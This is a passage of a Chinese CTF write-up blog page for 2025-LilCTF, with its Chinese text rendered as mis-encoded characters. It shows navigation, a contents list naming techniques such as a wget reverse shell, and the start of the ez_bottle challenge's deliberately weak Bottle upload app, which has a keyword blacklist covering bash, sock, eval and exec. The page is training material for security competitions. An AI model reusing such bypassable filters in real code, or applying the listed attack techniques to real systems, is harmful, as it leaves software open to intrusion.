  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#ez_"><strong>ez_bottle</strong></a>
      <ol>
        <li><a href="#è€ƒç‚¹abortå›æ˜¾å…¨è§’å­—ç¬¦ç»•è¿‡open">è€ƒç‚¹ï¼šabortå›æ˜¾+å…¨è§’å­—ç¬¦ç»•è¿‡open</a></li>
      </ol>
    </li>
    <li><a href="#your-uns3r"><strong>Your Uns3r</strong></a>
      <ol>
        <li><a href="#è€ƒç‚¹__php_incomplete_class_nameç»•è¿‡ç±»åè¿‡æ»¤peclcmdåŒ…å«">è€ƒç‚¹ï¼š__PHP_Incomplete_Class_Nameç»•è¿‡ç±»åè¿‡æ»¤+peclcmdåŒ…å«</a></li>
      </ol>
    </li>
    <li><a href="#ekko_note">Ekko_note</a>
      <ol>
        <li><a href="#è€ƒç‚¹åˆ©ç”¨uuid8ä¼ªé€ tokenpythonèµ·æœåŠ¡å™¨ä¼ªé€ apiwgetåå¼¹shell">è€ƒç‚¹ï¼šåˆ©ç”¨uuid8ä¼ªé€ token+pythonèµ·æœåŠ¡å™¨ä¼ªé€ api+wgetåå¼¹shell</a></li>
      </ol>
    </li>
    <li><a href="#æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ">æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ</a></li>
    <li><a href="#php_jail_is_my_cry">php_jail_is_my_cry</a>
      <ol>
        <li><a href="#è€ƒç‚¹includeè§£æpharæ–‡ä»¶æ‰§è¡Œå‘½ä»¤fileåè®®ç»•è¿‡open_basedirä»»æ„æ–‡ä»¶è¯»å–file_put_contentsæ‰“cve2024-2961">è€ƒç‚¹ï¼šincludeè§£æpharæ–‡ä»¶æ‰§è¡Œå‘½ä»¤+fileåè®®ç»•è¿‡open_basedirä»»æ„æ–‡ä»¶è¯»å–+file_put_contentsæ‰“cve2024-2961</a></li>
      </ol>
    </li>
    <li><a href="#warm-up-æ¥åŠ›turboflash">[WARM UP] æ¥åŠ›ï¼TurboFlash</a>
      <ol>
        <li><a href="#è€ƒç‚¹åˆ©ç”¨flaskçš„urlåˆ é™¤å­—ç¬¦æ€§è´¨ç»•è¿‡nginxçš„deny">è€ƒç‚¹ï¼šåˆ©ç”¨flaskçš„urlåˆ é™¤å­—ç¬¦æ€§è´¨ç»•è¿‡nginxçš„deny</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/write.up/" style="background-color: #2a9d8f; color: #fff;">
                write.up
            </a>
        
            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
                web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025-lilctf/">2025-LilCTF</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-08-15</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 21 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <hr>
<h2 id="ez_"><strong>ez_bottle</strong>
</h2><h3 id="è€ƒç‚¹abortå›æ˜¾å…¨è§’å­—ç¬¦ç»•è¿‡open">è€ƒç‚¹ï¼šabortå›æ˜¾+å…¨è§’å­—ç¬¦ç»•è¿‡open
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">post</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">static_file</span><span class="p">,</span> <span class="n">error</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æç¤ºï¼šflagåœ¨/flagè·¯å¾„ä¸‹ï¼Œå¯ä»¥å°è¯•è·å–</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä¸Šä¼ æ–‡ä»¶å­˜å‚¨ç›®å½•</span>
</span></span><span class="line"><span class="cl"><span class="n">UPLOAD_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="s1">&#39;uploads&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é™æ€æ–‡ä»¶ç›®å½•</span>
</span></span><span class="line"><span class="cl"><span class="n">STATIC_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="s1">&#39;static&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æœ€å¤§æ–‡ä»¶å¤§å°é™åˆ¶ï¼ˆ1MBï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">MAX_FILE_SIZE</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é»‘åå•å…³é”®è¯ï¼Œé˜²æ­¢æ¶æ„ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">BLACK_DICT</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s2">&#34;}&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;sock&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;bul&#34;</span><span class="p">,</span> <span class="s2">&#34;class&#34;</span><span class="p">,</span> <span class="s2">&#34;?&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;bash&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;globals&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="s2">&#34;get&#34;</span><span class="p">,</span> <span class="s2">&#34;open&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•å…³é”®è¯&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">any</span><span class="p">(</span><span class="n">black</span> <span class="ow">in</span> <span class="n">content</span> <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">BLACK_DICT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_symlink</span><span class="p">(</span><span class="n">zipinfo</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ£€æŸ¥zipæ¡ç›®æ˜¯å¦æ˜¯ç¬¦å·é“¾æ¥&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">zipinfo</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mo">0o170000</span> <span class="o">==</span> <span class="mo">0o120000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_safe_path</span><span class="p">(</span><span class="n">base_dir</span><span class="p">,</span> <span class="n">target_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ£€æŸ¥ç›®æ ‡è·¯å¾„æ˜¯å¦åœ¨åŸºç¡€ç›®å½•å†…ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">target_path</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">base_dir</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;è¿”å›é¦–é¡µ&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="n">STATIC_DIR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/static/&lt;filename&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_static</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æä¾›é™æ€æ–‡ä»¶æœåŠ¡&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="n">STATIC_DIR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_page</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;è¿”å›ä¸Šä¼ é¡µé¢&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="n">STATIC_DIR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¤„ç†æ–‡ä»¶ä¸Šä¼ &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è·å–ä¸Šä¼ çš„zipæ–‡ä»¶</span>
</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ£€æŸ¥æ˜¯å¦æ˜¯zipæ–‡ä»¶</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">zip_file</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.zip&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;æ— æ•ˆæ–‡ä»¶ï¼Œè¯·ä¸Šä¼ ZIPæ–‡ä»¶ã€‚&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># æ£€æŸ¥æ–‡ä»¶å¤§å°</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="o">&gt;</span> <span class="n">MAX_FILE_SIZE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;æ–‡ä»¶å¤§å°è¶…è¿‡1MBé™åˆ¶ï¼Œè¯·ä¸Šä¼ æ›´å°çš„æ–‡ä»¶ã€‚&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ç”Ÿæˆå”¯ä¸€ç›®å½•å</span>
</span></span><span class="line"><span class="cl">    <span class="n">current_time</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">unique_string</span> <span class="o">=</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span> <span class="o">+</span> <span class="n">current_time</span>
</span></span><span class="line"><span class="cl">    <span class="n">md5_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">unique_string</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">extract_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ä¿å­˜zipæ–‡ä»¶</span>
</span></span><span class="line"><span class="cl">    <span class="n">zip_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="s1">&#39;upload.zip&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">zip_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">file_info</span> <span class="ow">in</span> <span class="n">z</span><span class="o">.</span><span class="n">infolist</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># æ£€æŸ¥æ˜¯å¦åŒ…å«ç¬¦å·é“¾æ¥</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">is_symlink</span><span class="p">(</span><span class="n">file_info</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s1">&#39;ä¸å…è®¸åŒ…å«ç¬¦å·é“¾æ¥ã€‚&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># æ£€æŸ¥è·¯å¾„å®‰å…¨æ€§</span>
</span></span><span class="line"><span class="cl">                <span class="n">real_dest_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">file_info</span><span class="o">.</span><span class="n">filename</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">is_safe_path</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">real_dest_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s1">&#39;æ£€æµ‹åˆ°è·¯å¾„éå†æ”»å‡»ã€‚&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># è§£å‹æ–‡ä»¶</span>
